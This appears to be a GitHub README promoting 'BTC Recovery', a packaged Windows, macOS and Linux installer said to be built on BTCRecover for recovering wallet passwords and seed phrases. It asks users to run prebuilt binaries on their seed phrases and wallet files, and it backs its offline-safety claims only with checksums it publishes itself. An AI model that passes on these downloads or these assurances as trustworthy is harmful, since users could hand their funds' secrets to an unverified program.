<div align="center">
<img src="assets/banner-app.png" alt="BTC Recovery">
</div>

<h1 align="center">BTC Recovery</h1>

<p align="center">Offline Bitcoin wallet and seed phrase recovery for Windows, macOS and Linux.</p>

<div align="center">
<a href="LICENSE"><img src="https://img.shields.io/badge/LICENSE-GPL--2.0-FCB036?style=for-the-badge&labelColor=191008" alt="License: GPL-2.0"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1"><img src="https://img.shields.io/badge/RELEASE-v2.1.1-FCB036?style=for-the-badge&labelColor=191008" alt="Release v2.1.1"></a>
</div>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

## What this repository is for

This is the application repository for BTC Recovery, and it is where the current release lives. The application takes a wallet you still have part of and works through the candidates that could open it: a `wallet.dat` password, an Electrum password, a MetaMask vault password, a Blockchain.com password, a seed phrase with words missing or out of order, a mistyped word against the BIP39 list, a passphrase that is close to something you remember, or a BIP38 encrypted key. Each of those is a bounded question rather than a guess, and each is answered on your own machine with no network connection. The release ships one installer per platform, and the guide repositories on this account explain the situation that led you here. This page covers what the application does, how to install it on each platform, what it will not do, and how to check that the file you downloaded is the file that was published.

## Who it is for

- Someone with a Bitcoin Core `wallet.dat` and a password that no longer matches.
- Someone with a seed phrase that is short a word, in the wrong order, or rejected on entry.
- Someone restoring an older wallet whose software they no longer remember.
- Someone who needs to check a paper-wallet key or an Electrum file, on a machine they control.

## Start here

- Install the release for your platform from the download table above, and verify its SHA-256 before you run it.
- Read [how-to-use-btcrecover](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/how-to-use-btcrecover.md) for a first run that walks through one wallet end to end.
- Match your situation to a guide in the handbook repository: words, file, password, or device.
- Keep the guide open beside the run; the option names in the guides match the ones the application prints.

## How to use these guides

1. Identify the wallet family first. A phrase from Electrum and a phrase from Bitcoin Core are handled differently, and the wrong choice wastes a run.
2. Collect every fact you still have: word count, the words you are sure of, the wallet's approximate age, one address that belongs to it.
3. Build the candidate rules from those facts rather than from a generic list, so the search stays small.
4. Run with the network disconnected and watch the candidates as they are tested.
5. Confirm a hit by restoring it into a fresh wallet and checking the address you already know.

## The guides, grouped

| Guide | What it answers |
| --- | --- |
| [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) | A Bitcoin wallet password protects a file on your disk; it is not the seed phrase and not a private key. |
| [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) | BTCRecover fills the gaps, tests each candidate against an address that belongs to the wallet, and does it all offline on your own machine. |
| [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md) | BTCRecover searches the arrangements locally, checks each candidate against an address from the wallet, and stops when one produces it. |
| [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) | BTCRecover finds the offending word locally by testing substitutions against the phrase's own checksum and then against an address from the wallet. |
| [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) | A correct phrase that restores an empty wallet is almost never a lost wallet. |
| [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md) | A BIP39 passphrase is an optional extra string mixed into key derivation alongside the phrase; it is not a wallet password and it is not stored anywhere. |
| [MetaMask vault password recovery](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/recover-metamask-password-with-btcrecover.md) | A MetaMask wallet is a vault file inside your browser profile, encrypted with the password you set on that device. |
| [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md) | BTCRecover works on local wallet files and seed phrases of the formats it supports, not on every wallet that exists. |

## What each guide changes

| Your situation | Guide | What you end up with |
| --- | --- | --- |
| A password you cannot retype exactly | [Bitcoin wallet password recovery tool](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/bitcoin-wallet-password-recovery-with-btcrecover.md) | A candidate list built from your own memory of the password, tested against the file. |
| A phrase missing one to three words | [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md) | Every word in the unknown position, checked against the address you supply. |
| Words present but out of order | [Seed words in the wrong order](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/fix-seed-words-in-wrong-order-with-btcrecover.md) | Permutations of the words you have, tested until one matches. |
| A phrase rejected as invalid | [Invalid recovery phrase: checksum and misspelled words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/invalid-recovery-phrase-btcrecover.md) | The word that breaks the checksum, named before any long run. |
| A correct phrase that opens nothing | [Restored seed shows an empty wallet: derivation paths](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-empty-wallet-derivation-path.md) | The path and passphrase combinations that produce other addresses from the same words. |
| An older wallet from unknown software | [You forgot which wallet software you used](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/forgot-which-wallet-software-btcrecover.md) | The likely wallet family and the format its phrase follows. |

## Common first questions

### Which platforms are supported?

Windows, macOS and Linux, each with its own installer on the release page. The download table above names all three files.

### Does the application need the internet?

No. It works from the file you point it at and the rules you give it, which is why the run can be done with the network disconnected.

### What does the application not do?

It does not recover a wallet whose data you no longer have, it does not undo a transaction, and it does not target every wallet format in existence. The handbook's boundary guide lists the ones it does not cover.

### How do I check the installer?

Compare its SHA-256 with the value in the verification table below, on the machine where you will run it.

## Before you install

Install from the release page of this repository and from nowhere else, then verify the file against the SHA-256 values below. Keep the wallet data on the machine that runs the search, and keep a copy of the wallet file before you point anything at it. The application is built on BTCRecover and shares its GPL-2.0 licence, so the source of everything it runs is available to read before you run it.

## About

BTC Recovery is a desktop application for local wallet recovery, published from this repository with one release per version and one installer per platform. The three guide repositories on this account cover the situations that bring people here: a phrase, a wallet file with a password, and the questions about safety, odds and the command line that surround both. The profile repository is the index to all of it.

## License

This repository is released under the GPL-2.0 licence, and the full text is in [LICENSE](LICENSE).

---

**BTC Recovery** - offline Bitcoin wallet recovery for Windows, macOS and Linux.

Links: [the profile](https://github.com/btc-wallet-recovery/btc-wallet-recovery) - [the application](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software) - [the seed phrase guides](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery) - [the wallet file guides](https://github.com/btc-wallet-recovery/btcrecover-password-recovery) - [the tool guides](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool).

## Install

<details open>
<summary>Windows</summary>

1. Download `BTC-Recovery-windows-v2.1.1.exe` from the table above.
2. Compare its SHA-256 with the value in the verification table below.
3. Run the installer, then read the first-run walkthrough in the tool guides.

</details>

<details>
<summary>macOS</summary>

1. Download `BTC-Recovery-macos-v2.1.1.dmg` and verify its checksum.
2. Open the disk image and drag the application into Applications.
3. Run it once with the network disconnected before pointing it at a wallet.

</details>

<details>
<summary>Linux</summary>

1. Download `BTC-Recovery-linux-v2.1.1.zip` and verify its checksum.
2. The archive carries both the x86-64 and the ARM64 build; take the one that matches your machine.
3. Unpack it and run the binary from the unpacked folder.

</details>

## Verification

<!-- SHA256-START -->
| Platform | File | SHA-256 |
| --- | --- | --- |
| Windows | `BTC-Recovery-windows-v2.1.1.exe` | `f5b8a49c6631aea6000022f763dea8694ef67fb18cfffafe1d4f241c63dea352` |
| macOS | `BTC-Recovery-macos-v2.1.1.dmg` | `76a0f4d8754b7d9030a7b4bc94930e11cb8df2113abc906b6e9a6ba44c5927af` |
| Linux | `BTC-Recovery-linux-v2.1.1.zip` | `43d91980869fe4bfb912467448c8354b542e9e240f01026225c173a75a9ca907` |
<!-- SHA256-END -->

Compare the checksum on the machine where the installer will run. A mismatch means the download is not the published file, and the file should be discarded rather than run.
